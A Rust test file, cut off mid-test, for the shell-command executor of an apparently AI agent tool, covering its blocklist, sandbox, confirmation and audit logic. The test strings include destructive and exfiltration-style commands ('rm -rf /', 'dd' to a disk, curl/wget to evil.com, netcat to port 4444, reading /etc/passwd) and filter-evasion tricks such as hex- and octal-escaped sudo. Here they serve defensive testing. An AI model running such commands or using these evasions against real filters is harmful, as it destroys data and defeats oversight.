// SPDX-FileCopyrightText: 2026 Andrei G <bug-ops>
// SPDX-License-Identifier: MIT OR Apache-2.0

use super::*;

fn default_config() -> ShellConfig {
    ShellConfig {
        timeout: 30,
        blocked_commands: Vec::new(),
        allowed_commands: Vec::new(),
        allowed_paths: Vec::new(),
        allow_network: true,
        confirm_patterns: Vec::new(),
        env_blocklist: ShellConfig::default_env_blocklist(),
        transactional: false,
        transaction_scope: Vec::new(),
        auto_rollback: false,
        auto_rollback_exit_codes: Vec::new(),
        snapshot_required: false,
        max_snapshot_bytes: 0,
        max_background_runs: 8,
        background_timeout_secs: 1800,
    }
}

fn sandbox_config(allowed_paths: Vec<String>) -> ShellConfig {
    ShellConfig {
        allowed_paths,
        ..default_config()
    }
}

#[test]
fn extract_single_bash_block() {
    let text = "Here is code:\n```bash\necho hello\n```\nDone.";
    let blocks = extract_bash_blocks(text);
    assert_eq!(blocks, vec!["echo hello"]);
}

#[test]
fn extract_multiple_bash_blocks() {
    let text = "```bash\nls\n```\ntext\n```bash\npwd\n```";
    let blocks = extract_bash_blocks(text);
    assert_eq!(blocks, vec!["ls", "pwd"]);
}

#[test]
fn ignore_non_bash_blocks() {
    let text = "```python\nprint('hi')\n```\n```bash\necho hi\n```";
    let blocks = extract_bash_blocks(text);
    assert_eq!(blocks, vec!["echo hi"]);
}

#[test]
fn no_blocks_returns_none() {
    let text = "Just plain text, no code blocks.";
    let blocks = extract_bash_blocks(text);
    assert!(blocks.is_empty());
}

#[test]
fn unclosed_block_ignored() {
    let text = "```bash\necho hello";
    let blocks = extract_bash_blocks(text);
    assert!(blocks.is_empty());
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_simple_command() {
    let (envelope, result) = execute_bash(
        "echo hello",
        Duration::from_secs(30),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    assert!(result.contains("hello"));
    assert_eq!(envelope.exit_code, 0);
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_stderr_output() {
    let (envelope, result) = execute_bash(
        "echo err >&2",
        Duration::from_secs(30),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    assert!(result.contains("[stderr]"));
    assert!(result.contains("err"));
    assert!(envelope.stderr.contains("err"));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_stdout_and_stderr_combined() {
    let (envelope, result) = execute_bash(
        "echo out && echo err >&2",
        Duration::from_secs(30),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    assert!(result.contains("out"));
    assert!(result.contains("[stderr]"));
    assert!(result.contains("err"));
    assert!(result.contains('\n'));
    assert!(envelope.stdout.contains("out"));
    assert!(envelope.stderr.contains("err"));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn execute_empty_output() {
    let (envelope, result) = execute_bash(
        "true",
        Duration::from_secs(30),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    assert_eq!(result, "(no output)");
    assert_eq!(envelope.exit_code, 0);
}

#[tokio::test]
async fn blocked_command_rejected() {
    let config = ShellConfig {
        blocked_commands: vec!["rm -rf /".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let response = "Run:\n```bash\nrm -rf /\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn timeout_enforced() {
    let config = ShellConfig {
        timeout: 1,
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let response = "Run:\n```bash\nsleep 60\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::Timeout { timeout_secs: 1 })
    ));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn timeout_logged_as_audit_timeout_not_error() {
    use crate::audit::AuditLogger;
    use crate::config::AuditConfig;
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("audit.log");
    let audit_config = AuditConfig {
        enabled: true,
        destination: log_path.display().to_string(),
        tool_risk_summary: false,
    };
    let logger = std::sync::Arc::new(
        AuditLogger::from_config(&audit_config, false)
            .await
            .unwrap(),
    );
    let config = ShellConfig {
        timeout: 1,
        ..default_config()
    };
    let executor = ShellExecutor::new(&config).with_audit(logger);
    let _ = executor.execute("```bash\nsleep 60\n```").await;
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    assert!(
        content.contains("\"type\":\"timeout\""),
        "expected AuditResult::Timeout, got: {content}"
    );
    assert!(
        !content.contains("\"type\":\"error\""),
        "timeout must not be logged as error: {content}"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn stderr_output_logged_as_audit_error() {
    use crate::audit::AuditLogger;
    use crate::config::AuditConfig;
    let dir = tempfile::tempdir().unwrap();
    let log_path = dir.path().join("audit.log");
    let audit_config = AuditConfig {
        enabled: true,
        destination: log_path.display().to_string(),
        tool_risk_summary: false,
    };
    let logger = std::sync::Arc::new(
        AuditLogger::from_config(&audit_config, false)
            .await
            .unwrap(),
    );
    let executor = ShellExecutor::new(&default_config()).with_audit(logger);
    let _ = executor.execute("```bash\necho err >&2\n```").await;
    let content = tokio::fs::read_to_string(&log_path).await.unwrap();
    assert!(
        content.contains("\"type\":\"error\""),
        "expected AuditResult::Error for [stderr] output, got: {content}"
    );
}

#[tokio::test]
async fn execute_no_blocks_returns_none() {
    let executor = ShellExecutor::new(&default_config());
    let result = executor.execute("plain text, no blocks").await;
    assert!(result.is_ok());
    assert!(result.unwrap().is_none());
}

#[tokio::test]
async fn execute_multiple_blocks_counted() {
    let executor = ShellExecutor::new(&default_config());
    let response = "```bash\necho one\n```\n```bash\necho two\n```";
    let result = executor.execute(response).await;
    let output = result.unwrap().unwrap();
    assert_eq!(output.blocks_executed, 2);
    assert!(output.summary.contains("one"));
    assert!(output.summary.contains("two"));
}

// --- command filtering tests ---

#[test]
fn default_blocked_always_active() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("rm -rf /").is_some());
    assert!(executor.find_blocked_command("sudo apt install").is_some());
    assert!(
        executor
            .find_blocked_command("mkfs.ext4 /dev/sda")
            .is_some()
    );
    assert!(
        executor
            .find_blocked_command("dd if=/dev/zero of=disk")
            .is_some()
    );
}

#[test]
fn user_blocked_additive() {
    let config = ShellConfig {
        blocked_commands: vec!["custom-danger".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(executor.find_blocked_command("sudo rm").is_some());
    assert!(
        executor
            .find_blocked_command("custom-danger script")
            .is_some()
    );
}

#[test]
fn blocked_prefix_match() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("rm -rf /home/user").is_some());
}

#[test]
fn blocked_infix_match() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("echo hello && sudo rm")
            .is_some()
    );
}

#[test]
fn blocked_case_insensitive() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("SUDO apt install").is_some());
    assert!(executor.find_blocked_command("Sudo apt install").is_some());
    assert!(executor.find_blocked_command("SuDo apt install").is_some());
    assert!(
        executor
            .find_blocked_command("MKFS.ext4 /dev/sda")
            .is_some()
    );
    assert!(executor.find_blocked_command("DD IF=/dev/zero").is_some());
    assert!(executor.find_blocked_command("RM -RF /").is_some());
}

#[test]
fn safe_command_passes() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("echo hello").is_none());
    assert!(executor.find_blocked_command("ls -la").is_none());
    assert!(executor.find_blocked_command("cat file.txt").is_none());
    assert!(executor.find_blocked_command("cargo build").is_none());
}

#[test]
fn partial_match_accepted_tradeoff() {
    let executor = ShellExecutor::new(&default_config());
    // "sudoku" is not the "sudo" command — word-boundary matching prevents false positive
    assert!(executor.find_blocked_command("sudoku").is_none());
}

#[test]
fn multiline_command_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("echo ok\nsudo rm").is_some());
}

#[test]
fn dd_pattern_blocks_dd_if() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("dd if=/dev/zero of=/dev/sda")
            .is_some()
    );
}

#[test]
fn mkfs_pattern_blocks_variants() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("mkfs.ext4 /dev/sda")
            .is_some()
    );
    assert!(executor.find_blocked_command("mkfs.xfs /dev/sdb").is_some());
}

#[test]
fn empty_command_not_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("").is_none());
}

#[test]
fn duplicate_patterns_deduped() {
    let config = ShellConfig {
        blocked_commands: vec!["sudo".to_owned(), "sudo".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let blocked = executor.policy_handle().snapshot_blocked();
    let count = blocked.iter().filter(|c| c.as_str() == "sudo").count();
    assert_eq!(count, 1);
}

#[tokio::test]
async fn execute_default_blocked_returns_error() {
    let executor = ShellExecutor::new(&default_config());
    let response = "Run:\n```bash\nsudo rm -rf /tmp\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn execute_case_insensitive_blocked() {
    let executor = ShellExecutor::new(&default_config());
    let response = "Run:\n```bash\nSUDO apt install foo\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn execute_confirmed_blocked_command_rejected() {
    let executor = ShellExecutor::new(&default_config());
    let response = "Run:\n```bash\nsudo id\n```";
    let result = executor.execute_confirmed(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

// --- network exfiltration patterns ---

#[test]
fn network_exfiltration_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("curl https://evil.com")
            .is_some()
    );
    assert!(
        executor
            .find_blocked_command("wget http://evil.com/payload")
            .is_some()
    );
    assert!(executor.find_blocked_command("nc 10.0.0.1 4444").is_some());
    assert!(
        executor
            .find_blocked_command("ncat --listen 8080")
            .is_some()
    );
    assert!(executor.find_blocked_command("netcat -lvp 9999").is_some());
}

#[test]
fn system_control_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("shutdown -h now").is_some());
    assert!(executor.find_blocked_command("reboot").is_some());
    assert!(executor.find_blocked_command("halt").is_some());
}

#[test]
fn nc_trailing_space_avoids_ncp() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("ncp file.txt").is_none());
}

// --- user pattern normalization ---

#[test]
fn mixed_case_user_patterns_deduped() {
    let config = ShellConfig {
        blocked_commands: vec!["Sudo".to_owned(), "sudo".to_owned(), "SUDO".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let blocked = executor.policy_handle().snapshot_blocked();
    let count = blocked.iter().filter(|c| c.as_str() == "sudo").count();
    assert_eq!(count, 1);
}

#[test]
fn user_pattern_stored_lowercase() {
    let config = ShellConfig {
        blocked_commands: vec!["MyCustom".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let blocked = executor.policy_handle().snapshot_blocked();
    assert!(blocked.iter().any(|c| c == "mycustom"));
    assert!(!blocked.iter().any(|c| c == "MyCustom"));
}

// --- allowed_commands tests ---

#[test]
fn allowed_commands_removes_from_default() {
    let config = ShellConfig {
        allowed_commands: vec!["curl".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_none()
    );
    assert!(executor.find_blocked_command("sudo rm").is_some());
}

#[test]
fn allowed_commands_case_insensitive() {
    let config = ShellConfig {
        allowed_commands: vec!["CURL".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_none()
    );
}

#[test]
fn allowed_does_not_override_explicit_block() {
    let config = ShellConfig {
        blocked_commands: vec!["curl".to_owned()],
        allowed_commands: vec!["curl".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
}

#[test]
fn allowed_unknown_command_ignored() {
    let config = ShellConfig {
        allowed_commands: vec!["nonexistent-cmd".to_owned()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(executor.find_blocked_command("sudo rm").is_some());
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
}

#[test]
fn empty_allowed_commands_changes_nothing() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
    assert!(executor.find_blocked_command("sudo rm").is_some());
    assert!(
        executor
            .find_blocked_command("wget http://evil.com")
            .is_some()
    );
}

// --- Phase 1: sandbox tests ---

#[test]
fn extract_paths_from_code() {
    let paths = extract_paths("cat /etc/passwd && ls /var/log");
    assert_eq!(paths, vec!["/etc/passwd".to_owned(), "/var/log".to_owned()]);
}

#[test]
fn extract_paths_handles_trailing_chars() {
    let paths = extract_paths("cat /etc/passwd; echo /var/log|");
    assert_eq!(paths, vec!["/etc/passwd".to_owned(), "/var/log".to_owned()]);
}

#[test]
fn extract_paths_detects_relative() {
    let paths = extract_paths("cat ./file.txt ../other");
    assert_eq!(paths, vec!["./file.txt".to_owned(), "../other".to_owned()]);
}

#[test]
fn sandbox_allows_cwd_by_default() {
    let executor = ShellExecutor::new(&default_config());
    let cwd = std::env::current_dir().unwrap();
    let cwd_path = cwd.display().to_string();
    let code = format!("cat \"{cwd_path}/file.txt\"");
    assert!(executor.validate_sandbox(&code).is_ok());
}

#[test]
fn sandbox_rejects_path_outside_allowed() {
    let config = sandbox_config(vec!["/tmp/test-sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cat /etc/passwd");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn sandbox_no_absolute_paths_passes() {
    let config = sandbox_config(vec!["/tmp".into()]);
    let executor = ShellExecutor::new(&config);
    assert!(executor.validate_sandbox("echo hello").is_ok());
}

#[test]
fn sandbox_rejects_dotdot_traversal() {
    let config = sandbox_config(vec!["/tmp/sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cat ../../../etc/passwd");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn sandbox_rejects_bare_dotdot() {
    let config = sandbox_config(vec!["/tmp/sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cd ..");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn sandbox_rejects_relative_dotslash_outside() {
    let config = sandbox_config(vec!["/nonexistent/sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cat ./secret.txt");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn sandbox_rejects_absolute_with_embedded_dotdot() {
    let config = sandbox_config(vec!["/tmp/sandbox".into()]);
    let executor = ShellExecutor::new(&config);
    let result = executor.validate_sandbox("cat /tmp/sandbox/../../../etc/passwd");
    assert!(matches!(result, Err(ToolError::SandboxViolation { .. })));
}

#[test]
fn has_traversal_detects_dotdot() {
    assert!(has_traversal("../etc/passwd"));
    assert!(has_traversal("./foo/../bar"));
    assert!(has_traversal("/tmp/sandbox/../../etc"));
    assert!(has_traversal(".."));
    assert!(!has_traversal("./safe/path"));
    assert!(!has_traversal("/absolute/path"));
    assert!(!has_traversal("no-dots-here"));
}

#[test]
fn extract_paths_detects_dotdot_standalone() {
    let paths = extract_paths("cd ..");
    assert_eq!(paths, vec!["..".to_owned()]);
}

// --- Phase 1: allow_network tests ---

#[test]
fn allow_network_false_blocks_network_commands() {
    let config = ShellConfig {
        allow_network: false,
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
    assert!(
        executor
            .find_blocked_command("wget http://example.com")
            .is_some()
    );
    assert!(executor.find_blocked_command("nc 10.0.0.1 4444").is_some());
}

#[test]
fn allow_network_true_keeps_default_behavior() {
    let config = ShellConfig {
        allow_network: true,
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    // Network commands are still blocked by DEFAULT_BLOCKED
    assert!(
        executor
            .find_blocked_command("curl https://example.com")
            .is_some()
    );
}

// --- Phase 2a: confirmation tests ---

#[test]
fn find_confirm_command_matches_pattern() {
    let config = ShellConfig {
        confirm_patterns: vec!["rm ".into(), "git push -f".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert_eq!(
        executor.find_confirm_command("rm /tmp/file.txt"),
        Some("rm ")
    );
    assert_eq!(
        executor.find_confirm_command("git push -f origin main"),
        Some("git push -f")
    );
}

#[test]
fn find_confirm_command_case_insensitive() {
    let config = ShellConfig {
        confirm_patterns: vec!["drop table".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(executor.find_confirm_command("DROP TABLE users").is_some());
}

#[test]
fn find_confirm_command_no_match() {
    let config = ShellConfig {
        confirm_patterns: vec!["rm ".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    assert!(executor.find_confirm_command("echo hello").is_none());
}

#[tokio::test]
async fn confirmation_required_returned() {
    let config = ShellConfig {
        confirm_patterns: vec!["rm ".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let response = "```bash\nrm file.txt\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

#[tokio::test]
async fn execute_confirmed_skips_confirmation() {
    let config = ShellConfig {
        confirm_patterns: vec!["echo".into()],
        ..default_config()
    };
    let executor = ShellExecutor::new(&config);
    let response = "```bash\necho confirmed\n```";
    let result = executor.execute_confirmed(response).await;
    assert!(result.is_ok());
    let output = result.unwrap().unwrap();
    assert!(output.summary.contains("confirmed"));
}

// --- default confirm patterns test ---

#[test]
fn default_confirm_patterns_loaded() {
    let config = ShellConfig::default();
    assert!(!config.confirm_patterns.is_empty());
    assert!(config.confirm_patterns.contains(&"rm ".to_owned()));
    assert!(config.confirm_patterns.contains(&"git push -f".to_owned()));
    assert!(config.confirm_patterns.contains(&"$(".to_owned()));
    assert!(config.confirm_patterns.contains(&"`".to_owned()));
}

// --- bypass-resistant matching tests ---

#[test]
fn backslash_bypass_blocked() {
    let executor = ShellExecutor::new(&default_config());
    // su\do -> sudo after stripping backslash
    assert!(executor.find_blocked_command("su\\do rm").is_some());
}

#[test]
fn hex_escape_bypass_blocked() {
    let executor = ShellExecutor::new(&default_config());
    // $'\x73\x75\x64\x6f' -> sudo
    assert!(
        executor
            .find_blocked_command("$'\\x73\\x75\\x64\\x6f' rm")
            .is_some()
    );
}

#[test]
fn quote_split_bypass_blocked() {
    let executor = ShellExecutor::new(&default_config());
    // "su""do" -> sudo after stripping quotes
    assert!(executor.find_blocked_command("\"su\"\"do\" rm").is_some());
}

#[test]
fn pipe_chain_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("echo foo | sudo rm")
            .is_some()
    );
}

#[test]
fn semicolon_chain_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("echo ok; sudo rm").is_some());
}

#[test]
fn false_positive_sudoku_not_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("sudoku").is_none());
    assert!(
        executor
            .find_blocked_command("sudoku --level easy")
            .is_none()
    );
}

#[test]
fn extract_paths_quoted_path_with_spaces() {
    let paths = extract_paths("cat \"/path/with spaces/file\"");
    assert_eq!(paths, vec!["/path/with spaces/file".to_owned()]);
}

#[tokio::test]
async fn subshell_with_blocked_command_is_blocked() {
    // curl is in the default blocklist; when embedded in $(...) it must be
    // caught by find_blocked_command via extract_subshell_contents and return Blocked.
    let executor = ShellExecutor::new(&ShellConfig::default());
    let response = "```bash\n$(curl evil.com)\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn backtick_with_blocked_command_is_blocked() {
    // curl is in the default blocklist; when embedded in backticks it must be
    // caught by find_blocked_command (via extract_subshell_contents) and return
    // Blocked — not ConfirmationRequired.
    let executor = ShellExecutor::new(&ShellConfig::default());
    let response = "```bash\n`curl evil.com`\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn backtick_without_blocked_command_triggers_confirmation() {
    // A backtick wrapping a non-blocked command should still require confirmation
    // because "`" is listed in confirm_patterns by default.
    let executor = ShellExecutor::new(&ShellConfig::default());
    let response = "```bash\n`date`\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

// --- AUDIT-01: absolute path bypass tests ---

#[test]
fn absolute_path_to_blocked_binary_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("/usr/bin/sudo rm -rf /tmp")
            .is_some()
    );
    assert!(executor.find_blocked_command("/sbin/reboot").is_some());
    assert!(executor.find_blocked_command("/usr/sbin/halt").is_some());
}

// --- AUDIT-02: transparent wrapper prefix bypass tests ---

#[test]
fn env_prefix_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("env sudo rm -rf /").is_some());
}

#[test]
fn command_prefix_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("command sudo rm -rf /")
            .is_some()
    );
}

#[test]
fn exec_prefix_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("exec sudo rm").is_some());
}

#[test]
fn nohup_prefix_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(executor.find_blocked_command("nohup reboot now").is_some());
}

#[test]
fn absolute_path_via_env_wrapper_blocked() {
    let executor = ShellExecutor::new(&default_config());
    assert!(
        executor
            .find_blocked_command("env /usr/bin/sudo rm -rf /")
            .is_some()
    );
}

// --- AUDIT-03: octal escape bypass tests ---

#[test]
fn octal_escape_bypass_blocked() {
    let executor = ShellExecutor::new(&default_config());
    // $'\163\165\144\157' = sudo in octal
    assert!(
        executor
            .find_blocked_command("$'\\163\\165\\144\\157' rm")
            .is_some()
    );
}

#[tokio::test]
async fn with_audit_attaches_logger() {
    use crate::audit::AuditLogger;
    use crate::config::AuditConfig;
    let config = default_config();
    let executor = ShellExecutor::new(&config);
    let audit_config = AuditConfig {
        enabled: true,
        destination: "stdout".into(),
        tool_risk_summary: false,
    };
    let logger = std::sync::Arc::new(
        AuditLogger::from_config(&audit_config, false)
            .await
            .unwrap(),
    );
    let executor = executor.with_audit(logger);
    assert!(executor.audit_logger.is_some());
}

#[test]
fn chrono_now_returns_valid_timestamp() {
    let ts = chrono_now();
    assert!(!ts.is_empty());
    let parsed: u64 = ts.parse().unwrap();
    assert!(parsed > 0);
}

#[cfg(unix)]
#[tokio::test]
async fn execute_bash_injects_extra_env() {
    let mut env = std::collections::HashMap::new();
    env.insert(
        "ZEPH_TEST_INJECTED_VAR".to_owned(),
        "hello-from-env".to_owned(),
    );
    let (envelope, result) = execute_bash(
        "echo $ZEPH_TEST_INJECTED_VAR",
        Duration::from_secs(5),
        None,
        None,
        Some(&env),
        &[],
        None,
        "",
    )
    .await;
    assert_eq!(envelope.exit_code, 0);
    assert!(result.contains("hello-from-env"));
}

#[cfg(unix)]
#[tokio::test]
async fn shell_executor_set_skill_env_injects_vars() {
    use crate::executor::ToolExecutor;

    let config = ShellConfig {
        timeout: 5,
        allow_network: false,
        ..default_config()
    };

    let executor = ShellExecutor::new(&config);
    let mut env = std::collections::HashMap::new();
    env.insert("MY_SKILL_SECRET".to_owned(), "injected-value".to_owned());
    executor.set_skill_env(Some(env));
    let result = executor
        .execute("```bash\necho $MY_SKILL_SECRET\n```")
        .await
        .unwrap()
        .unwrap();
    assert!(result.summary.contains("injected-value"));
    executor.set_skill_env(None);
}

#[cfg(unix)]
#[tokio::test]
async fn execute_bash_error_handling() {
    let (envelope, result) = execute_bash(
        "false",
        Duration::from_secs(5),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    assert_eq!(result, "(no output)");
    assert_eq!(envelope.exit_code, 1);
}

#[cfg(unix)]
#[tokio::test]
async fn execute_bash_command_not_found() {
    let (_, result) = execute_bash(
        "nonexistent-command-xyz",
        Duration::from_secs(5),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    assert!(result.contains("[stderr]") || result.contains("[error]"));
}

#[test]
fn extract_paths_empty() {
    assert!(extract_paths("").is_empty());
}

#[test]
fn extract_paths_relative_without_prefix() {
    let paths = extract_paths("cargo build src/main.rs");
    assert!(
        paths.contains(&"src/main.rs".to_owned()),
        "src/main.rs must be detected"
    );
}

#[test]
fn extract_paths_relative_nested() {
    let paths = extract_paths("cat .local/foo/bar");
    assert!(
        paths.contains(&".local/foo/bar".to_owned()),
        ".local/foo/bar must be detected"
    );
}

#[test]
fn extract_paths_does_not_match_urls() {
    let paths = extract_paths("curl https://example.com/file");
    assert!(
        !paths.contains(&"https://example.com/file".to_owned()),
        "URLs must not be matched as paths"
    );
}

#[test]
fn extract_paths_does_not_match_env_assignments() {
    let paths = extract_paths("KEY=some/value cargo build");
    assert!(
        !paths.contains(&"KEY=some/value".to_owned()),
        "env assignments must not be matched as paths"
    );
}

#[tokio::test]
async fn policy_deny_blocks_command() {
    let policy = PermissionPolicy::from_legacy(&["forbidden".to_owned()], &[]);
    let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
    let response = "```bash\nforbidden command\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[tokio::test]
async fn policy_ask_requires_confirmation() {
    let policy = PermissionPolicy::from_legacy(&[], &["risky".to_owned()]);
    let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
    let response = "```bash\nrisky operation\n```";
    let result = executor.execute(response).await;
    assert!(matches!(
        result,
        Err(ToolError::ConfirmationRequired { .. })
    ));
}

#[tokio::test]
async fn policy_allow_skips_checks() {
    use crate::permissions::PermissionRule;
    use std::collections::HashMap;
    let mut rules = HashMap::new();
    rules.insert(
        "bash".to_owned(),
        vec![PermissionRule {
            pattern: "*".to_owned(),
            action: PermissionAction::Allow,
        }],
    );
    let policy = PermissionPolicy::new(rules);
    let executor = ShellExecutor::new(&default_config()).with_permissions(policy);
    let response = "```bash\necho hello\n```";
    let result = executor.execute(response).await;
    assert!(result.is_ok());
}

#[tokio::test]
async fn blocked_command_logged_to_audit() {
    use crate::audit::AuditLogger;
    use crate::config::AuditConfig;
    let config = ShellConfig {
        blocked_commands: vec!["dangerous".to_owned()],
        ..default_config()
    };
    let audit_config = AuditConfig {
        enabled: true,
        destination: "stdout".into(),
        tool_risk_summary: false,
    };
    let logger = std::sync::Arc::new(
        AuditLogger::from_config(&audit_config, false)
            .await
            .unwrap(),
    );
    let executor = ShellExecutor::new(&config).with_audit(logger);
    let response = "```bash\ndangerous command\n```";
    let result = executor.execute(response).await;
    assert!(matches!(result, Err(ToolError::Blocked { .. })));
}

#[test]
fn tool_definitions_returns_bash() {
    let executor = ShellExecutor::new(&default_config());
    let defs = executor.tool_definitions();
    assert_eq!(defs.len(), 1);
    assert_eq!(defs[0].id, "bash");
    assert_eq!(
        defs[0].invocation,
        crate::registry::InvocationHint::FencedBlock("bash")
    );
}

#[test]
fn tool_definitions_schema_has_command_param() {
    let executor = ShellExecutor::new(&default_config());
    let defs = executor.tool_definitions();
    let obj = defs[0].schema.as_object().unwrap();
    let props = obj["properties"].as_object().unwrap();
    assert!(props.contains_key("command"));
    let req = obj["required"].as_array().unwrap();
    assert!(req.iter().any(|v| v.as_str() == Some("command")));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn cancel_token_kills_child_process() {
    let token = CancellationToken::new();
    let token_clone = token.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(100)).await;
        token_clone.cancel();
    });
    let (envelope, result) = execute_bash(
        "sleep 60",
        Duration::from_secs(30),
        None,
        Some(&token),
        None,
        &[],
        None,
        "",
    )
    .await;
    assert_eq!(envelope.exit_code, 130);
    assert!(result.contains("[cancelled]"));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn cancel_token_none_does_not_cancel() {
    let (envelope, result) = execute_bash(
        "echo ok",
        Duration::from_secs(5),
        None,
        None,
        None,
        &[],
        None,
        "",
    )
    .await;
    assert_eq!(envelope.exit_code, 0);
    assert!(result.contains("ok"));
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn cancel_kills_child_process_group() {
    use std::path::Path;
    let marker = format!("/tmp/zeph-pgkill-test-{}", std::process::id());
    let script = format!("bash -c 'sleep 30 && touch {marker}' & sleep 60");
    let token = CancellationToken::new();
    let token_clone = token.clone();
    tokio::spawn(async move {
        tokio::time::sleep(Duration::from_millis(200)).await;
        token_clone.cancel();
    });
    let (envelope, result) = execute_bash(
        &script,
        Duration::from_secs(30),
        None,
        Some(&token),
        None,
        &[],
        None,
        "",
    )
    .await;
    assert_eq!(envelope.exit_code, 130);
    assert!(result.contains("[cancelled]"));
    // Wait briefly, then verify the subprocess did NOT create the marker file
    tokio::time::sleep(Duration::from_millis(500)).await;
    assert!(
        !Path::new(&marker).exists(),
        "subprocess should have been killed with process group"
    );
}

#[tokio::test]
#[cfg(not(target_os = "windows"))]
async fn shell_executor_cancel_returns_cancelled_error() {
    let token = CancellationToken::new();
    let token_clone = token.clone();
    tokio::spawn(async move {
